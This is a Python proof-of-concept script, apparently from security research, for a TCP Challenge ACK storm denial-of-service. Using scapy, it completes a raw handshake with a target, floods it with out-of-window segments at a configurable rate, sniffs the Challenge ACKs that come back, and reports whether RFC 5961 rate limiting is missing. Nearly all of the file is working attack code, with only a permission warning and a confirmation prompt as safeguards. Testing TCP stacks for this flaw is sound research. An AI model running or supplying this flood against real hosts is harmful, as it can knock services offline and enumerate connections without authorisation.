#!/usr/bin/env python3
"""
Challenge ACK Storm DoS PoC

Demonstrates the lack of Challenge ACK rate limiting in the TCP implementation.
RFC 5961 Section 5 requires rate limiting to prevent ACK storms and info leaks.

This PoC sends TCP segments with invalid sequence numbers to trigger Challenge ACKs.
A vulnerable implementation will respond to every packet, allowing:
- DoS via CPU/bandwidth exhaustion
- Connection enumeration (information disclosure)
- ACK storm amplification

Author: Security Research
License: Educational/Research Use Only
"""

import argparse
import sys
import time
import signal
from scapy.all import *

class ChallengeACKStorm:
    def __init__(self, target_ip, target_port, source_port=None, rate=100):
        self.target_ip = target_ip
        self.target_port = target_port
        self.source_port = source_port or random.randint(10000, 65000)
        self.rate = rate
        self.packets_sent = 0
        self.acks_received = 0
        self.start_time = None
        self.running = False

    def establish_connection(self):
        """Establish a real TCP connection to get valid 4-tuple"""
        print(f"[*] Establishing connection to {self.target_ip}:{self.target_port}")

        # Send SYN
        ip = IP(dst=self.target_ip)
        syn = TCP(sport=self.source_port, dport=self.target_port,
                  flags='S', seq=1000)
        syn_ack = sr1(ip/syn, timeout=2, verbose=0)

        if not syn_ack or not syn_ack.haslayer(TCP):
            print("[-] Failed to receive SYN-ACK")
            return None

        if syn_ack[TCP].flags != 'SA':
            print(f"[-] Unexpected response: {syn_ack[TCP].flags}")
            return None

        print(f"[+] Received SYN-ACK (seq={syn_ack[TCP].seq}, ack={syn_ack[TCP].ack})")

        # Send ACK to complete handshake
        ack = TCP(sport=self.source_port, dport=self.target_port,
                  flags='A', seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1)
        send(ip/ack, verbose=0)

        print("[+] Connection established")

        # Return connection state
        return {
            'seq': syn_ack[TCP].ack,
            'ack': syn_ack[TCP].seq + 1,
            'window': syn_ack[TCP].window
        }

    def send_invalid_segments(self, conn_state):
        """Send segments with invalid sequence numbers to trigger Challenge ACKs"""
        print(f"[*] Starting Challenge ACK storm at {self.rate} pps")
        print(f"[*] Press Ctrl+C to stop and show statistics\n")

        ip = IP(dst=self.target_ip)
        self.start_time = time.time()
        self.running = True

        # Calculate delay between packets to achieve desired rate
        delay = 1.0 / self.rate if self.rate > 0 else 0

        try:
            while self.running:
                # Send packet with sequence number way outside the window
                # This should trigger a Challenge ACK per RFC 5961
                invalid_seq = conn_state['seq'] + 0x7FFFFFFF  # Far future sequence

                # Create segment with invalid sequence but valid ACK
                pkt = TCP(sport=self.source_port, dport=self.target_port,
                         flags='A', seq=invalid_seq, ack=conn_state['ack'])

                send(ip/pkt, verbose=0)
                self.packets_sent += 1

                # Print progress every 100 packets
                if self.packets_sent % 100 == 0:
                    elapsed = time.time() - self.start_time
                    actual_rate = self.packets_sent / elapsed if elapsed > 0 else 0
                    print(f"\r[*] Sent: {self.packets_sent} packets | "
                          f"Rate: {actual_rate:.1f} pps | "
                          f"Time: {elapsed:.1f}s", end='', flush=True)

                # Rate limiting
                if delay > 0:
                    time.sleep(delay)

        except KeyboardInterrupt:
            print("\n\n[*] Stopping attack...")
            self.running = False

    def sniff_responses(self, conn_state, duration=10):
        """Sniff and count Challenge ACK responses"""
        print(f"[*] Monitoring Challenge ACK responses for {duration} seconds...")

        # Filter for ACKs from target
        filter_str = f"tcp and src host {self.target_ip} and src port {self.target_port} and dst port {self.source_port}"

        def packet_callback(pkt):
            if pkt.haslayer(TCP):
                tcp = pkt[TCP]
                # Challenge ACK should have the correct ACK number (our next expected seq)
                if tcp.flags == 'A' and tcp.ack == conn_state['seq']:
                    self.acks_received += 1

        # Sniff for specified duration
        sniff(filter=filter_str, prn=packet_callback, timeout=duration, store=0)

        print(f"\n[+] Received {self.acks_received} Challenge ACKs in {duration} seconds")
        print(f"[+] Rate: {self.acks_received / duration:.1f} ACKs/sec")

        # Check if rate limiting is present
        if self.acks_received / duration > 110:  # RFC 5961 suggests ~100/sec limit
            print("[!] VULNERABLE: No effective rate limiting detected!")
            print("[!] Target responds at unlimited rate")
        elif self.acks_received / duration > 90:
            print("[~] POSSIBLE: Rate limiting may be present (~100/sec)")
        else:
            print("[+] MITIGATED: Rate limiting appears to be working")

    def run_storm_test(self):
        """Run the Challenge ACK storm test"""
        # Establish connection
        conn_state = self.establish_connection()
        if not conn_state:
            print("[-] Failed to establish connection")
            return False

        time.sleep(1)

        # Start sniffing in background
        import threading
        sniffer = threading.Thread(target=self.sniff_responses,
                                   args=(conn_state, 30))
        sniffer.daemon = True
        sniffer.start()

        time.sleep(1)

        # Send invalid segments
        self.send_invalid_segments(conn_state)

        # Wait for sniffer to finish
        sniffer.join(timeout=5)

        # Print final statistics
        self.print_statistics()

        return True

    def print_statistics(self):
        """Print attack statistics"""
        if self.start_time:
            elapsed = time.time() - self.start_time
            actual_rate = self.packets_sent / elapsed if elapsed > 0 else 0

            print("\n" + "="*60)
            print("ATTACK STATISTICS")
            print("="*60)
            print(f"Target:           {self.target_ip}:{self.target_port}")
            print(f"Source Port:      {self.source_port}")
            print(f"Duration:         {elapsed:.2f} seconds")
            print(f"Packets Sent:     {self.packets_sent}")
            print(f"Attack Rate:      {actual_rate:.2f} pps (target: {self.rate} pps)")
            print(f"ACKs Received:    {self.acks_received}")

            if self.acks_received > 0:
                response_rate = self.acks_received / elapsed
                ratio = (self.acks_received / self.packets_sent) * 100
                print(f"Response Rate:    {response_rate:.2f} ACKs/sec")
                print(f"Response Ratio:   {ratio:.1f}%")

                print("\nVULNERABILITY ASSESSMENT:")
                if response_rate > 110:
                    print("  [!] VULNERABLE - No rate limiting detected")
                    print("  [!] Target can be DoS'd with Challenge ACK storm")
                    print("  [!] Bandwidth amplification: ~40 bytes in, ~54 bytes out")
                elif response_rate > 90:
                    print("  [~] UNCLEAR - Possible rate limiting around RFC 5961 limit")
                    print("  [~] Recommend longer test duration")
                else:
                    print("  [+] PROTECTED - Rate limiting appears effective")
            else:
                print(f"\nNo ACKs received - connection may have closed")

            print("="*60)

def main():
    parser = argparse.ArgumentParser(
        description='Challenge ACK Storm DoS PoC',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic test at 100 pps
  sudo python3 challenge_ack_storm.py --target 10.0.0.2 --port 8080

  # High-rate test
  sudo python3 challenge_ack_storm.py --target 10.0.0.2 --port 8080 --rate 1000

  # Custom source port
  sudo python3 challenge_ack_storm.py --target 10.0.0.2 --port 8080 --sport 12345

Warning:
  Only use against systems you own or have permission to test.
  This is an attack tool and may be flagged as malicious traffic.
        """)

    parser.add_argument('--target', required=True, help='Target IP address')
    parser.add_argument('--port', type=int, required=True, help='Target TCP port')
    parser.add_argument('--sport', type=int, help='Source port (random if not specified)')
    parser.add_argument('--rate', type=int, default=100,
                       help='Packet rate in pps (default: 100)')

    args = parser.parse_args()

    # Check for root
    if os.geteuid() != 0:
        print("[-] This script requires root privileges (for raw sockets)")
        print("[-] Please run with sudo")
        sys.exit(1)

    print("""
╔═══════════════════════════════════════════════════════════╗
║         Challenge ACK Storm DoS PoC                       ║
║         RFC 5961 Rate Limiting Test                       ║
╚═══════════════════════════════════════════════════════════╝
""")

    print(f"Target:       {args.target}:{args.port}")
    print(f"Attack Rate:  {args.rate} pps")
    print(f"Source Port:  {args.sport if args.sport else 'random'}")
    print()

    # Confirm before proceeding
    try:
        confirm = input("Proceed with attack? [y/N]: ")
        if confirm.lower() != 'y':
            print("Aborted.")
            sys.exit(0)
    except KeyboardInterrupt:
        print("\nAborted.")
        sys.exit(0)

    # Run the test
    storm = ChallengeACKStorm(args.target, args.port, args.sport, args.rate)
    storm.run_storm_test()

if __name__ == '__main__':
    main()
